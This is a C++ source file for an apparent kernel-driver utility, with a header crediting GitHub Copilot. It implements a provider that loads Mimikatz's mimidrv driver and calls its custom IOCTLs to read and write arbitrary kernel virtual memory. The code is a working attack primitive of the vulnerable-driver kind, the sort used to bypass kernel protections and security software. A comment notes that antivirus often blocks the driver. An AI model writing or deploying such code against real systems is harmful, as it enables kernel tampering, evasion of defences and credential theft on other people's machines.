/**
 * @file MimidrvProvider.cpp
 * @author GitHub Copilot
 * @date January 29, 2026
 * @brief Mimikatz mimidrv provider implementation.
 */

#include "MimidrvProvider.h"

namespace KernelMode {
    namespace Providers {

        MimidrvProvider::MimidrvProvider() : BaseProvider(CreateConfig()) {
        }

        ProviderConfig MimidrvProvider::CreateConfig() {
            ProviderConfig config = {};
            
            config.providerName = L"Mimikatz mimidrv Provider";
            config.deviceName = L"mimidrv"; 
            config.serviceName = L"mimidrv";
            config.driverId = 32; // DRIVER_ID_MIMIDRV in our DriverDataManager.h
            
            config.capabilities = 
                CAPABILITY_VIRTUAL_MEMORY;
            
            // IOCTLs are custom, so we set to 0 here and override methods
            config.readMemoryIOCTL = 0; 
            config.writeMemoryIOCTL = 0;
            
            // Load data
            config.loadData = CreateLoadData();
            
            return config;
        }

        ProviderLoadData MimidrvProvider::CreateLoadData() {
            ProviderLoadData loadData = {};
            
            loadData.PhysMemoryBruteForce = false;
            loadData.PML4FromLowStub = false;
            loadData.PreferPhysical = false;
            loadData.RequiresDSE = false; // Signed, but often blocked by AV
            loadData.Capabilities = CAPABILITY_VIRTUAL_MEMORY;
            loadData.Description = L"Mimikatz mimidrv - Arbitrary Virtual R/W";
            
            return loadData;
        }

        bool MimidrvProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (!IsValidHandle() || !buffer || size == 0) {
                return false;
            }

            // METHOD_NEITHER for Read:
            // kdu: supCallDriver(DeviceHandle, IOCTL_MIMIDRV_VM_READ, (PVOID)VirtualAddress, 0, Buffer, NumberOfBytes);
            // InputBuffer = VirtualAddress (The source address to read FROM)
            // OutputBuffer = Buffer (The destination to write TO)
            // OutputBufferSize = NumberOfBytes
            
            // Note: DeviceIoControl parameters:
            // lpInBuffer -> VirtualAddress
            // nInBufferSize -> 0 (Or ignored because it's METHOD_NEITHER??) 
            // Actually, for METHOD_NEITHER:
            // Type 3 Input: Irp->Parameters.DeviceIoControl.Type3InputBuffer = lpInBuffer
            // UserBuffer: Irp->UserBuffer = lpOutBuffer
            
            // Windows DeviceIoControl passes:
            // lpInBuffer as Type3InputBuffer
            // lpOutBuffer as UserBuffer
            
            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle_,
                IOCTL_MIMIDRV_VM_READ,
                (LPVOID)address,    // Abuse "Buffer" pointer to pass the address directly?
                                    // NO. KDU passes (PVOID)VirtualAddress as lpInBuffer.
                                    // Check if Windows validates this pointer before passing to driver?
                                    // For METHOD_NEITHER, I/O Manager doesn't validate.
                                    // However, DeviceIoControl API itself might not care if nInBufferSize is 0.
                                    // KDU passes nInBufferSize=0.
                0,                  // InputBufferSize = 0
                buffer,             // OutputBuffer = Destination
                static_cast<DWORD>(size), // OutputBufferSize
                &bytesReturned,
                NULL
            );
        }

        bool MimidrvProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (!IsValidHandle() || !buffer || size == 0) {
                return false;
            }

            // METHOD_NEITHER for Write:
            // kdu: supCallDriver(DeviceHandle, IOCTL_MIMIDRV_VM_WRITE, Buffer, NumberOfBytes, (PVOID)VirtualAddress, 0);
            // InputBuffer = Buffer (Source data)
            // InputBufferSize = NumberOfBytes
            // OutputBuffer = VirtualAddress (Destination address)
            // OutputBufferSize = 0
            
            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle_,
                IOCTL_MIMIDRV_VM_WRITE,
                buffer,             // InputBuffer = Source Data
                static_cast<DWORD>(size),       // InputBufferSize
                (LPVOID)address,    // OutputBuffer = Destination Address
                0,                  // OutputBufferSize = 0
                &bytesReturned,
                NULL
            );
        }

    } // namespace Providers
} // namespace KernelMode
